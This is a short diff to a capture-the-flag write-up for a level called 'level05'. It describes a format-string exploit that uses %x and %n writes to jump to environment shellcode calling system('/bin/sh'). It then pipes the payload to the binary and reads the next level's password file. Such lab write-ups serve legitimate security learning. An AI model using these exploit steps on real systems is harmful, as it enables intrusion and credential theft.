@@ -7,7 +7,7 @@
 - We generate a shell that will just call `system("/bin/sh")` and export it in the env.
 - In a payload, we use a combination of `%yx` to print y spaces and `%x$n` to write the number of char print on the x offset.
 ## Answer
-    export SHELLCODE=$(python generate_shellcode.py)
+    export SHELLCODE=$(python /tmp/generate_shellcode.py)
     cat /tmp/payload - | ./level05
     cat /home/users/level06/.pass
 ## Flag
